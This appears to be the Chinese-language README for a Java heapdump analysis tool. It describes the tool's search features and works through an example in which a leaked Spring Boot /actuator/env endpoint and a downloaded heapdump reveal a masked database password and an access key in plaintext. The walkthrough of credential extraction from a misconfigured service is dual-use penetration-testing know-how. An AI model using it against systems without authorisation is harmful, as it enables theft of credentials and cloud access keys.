# heapdump_tool

```
声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。
下载地址：https://toolaffix.oss-cn-beijing.aliyuncs.com/1/heapdump_tool.jar


+ 使用体感和部分功能调优。
+ 对gz文件自动解压
+ 增加了模式选择，大于15W数据时，可以选择模式0 ，不用加载所有数据，直接快速查询数据


该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe， 
在控制台输入jhat检查是否安装正确。

usage:> java -jar heapdump_tool.jar  heapdump
查询方式：
1. 关键词    例如 password 
2. 字符长度   len=10    获取长度为10的所有key或者value值
3. 按顺序获取  num=1-100 获取顺序1-100的字符
获取url,file,ip
geturl   获取所有字符串中的url
getfile  获取所有字符串中的文件路径文件名
getip    获取所有字符串中的ip
默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=true，all=false取消显示所有值。

----------------------------------------------------

常见的heapdump泄露，大多都是spring heapdump泄露

这里以spring heapdump泄露 为例

访问 /actuator/env  得到部分信息如下

properties: {
spring.datasource.driver-class-name: {
value: "com.mysql.cj.jdbc.Driver",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:3:24"
},
spring.datasource.url: {
value: "jdbc:mysql://test.mysql.rds.aliyuncs.com:3306/test?useUnicode=true&characterEncoding=utf-8&useTimezone=true&serverTimezone=GMT%2B8",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:4:10"
},
spring.datasource.username: {
value: "root",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:5:15"
},
spring.datasource.password: {
value: "******",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:6:15"
},

页面返回内容 spring.datasource.password 的值为 *******

下载 heapdump 文件， 然后使用工具
root@wy:~# 
> java -jar heapdump_tool.jar  heapdump.6
[-] file: heapdump.6
[-] Start jhat, waiting...
[-] get objects,waiting(1-2min)...
[-] fing object count: 113128
[-] please input keyword value to search, example: password,len=16,num=0-10,all=true,geturl,getfile,getip input q/quit to quit.
> spring.datasource.password
[-] Start find keyword: spring.datasource.password
>> spring.datasource.password -> test@wyzxxz 
[-] please input keyword value to search, example: password,len=16,num=0-10,all=true,geturl,getfile,getip input q/quit to quit.
> accesskey
[-] Start find keyword: accessKey
>> ConnectionProperties.noAccessToProcedureBodies -> When determining procedure parameter types for CallableStatements, and the connected user can&#039;&#039;t access procedure bodies through &quot;SHOW CREATE PROCEDURE&quot; or select on mysql.proc should the driver instead create basic metadata
>> accessKey -> LTA**************
[-] please input keyword value to search, example: password,len=16,num=0-10,all=true,geturl,getfile,getip input q/quit to quit.
> q
[-] exit.



```



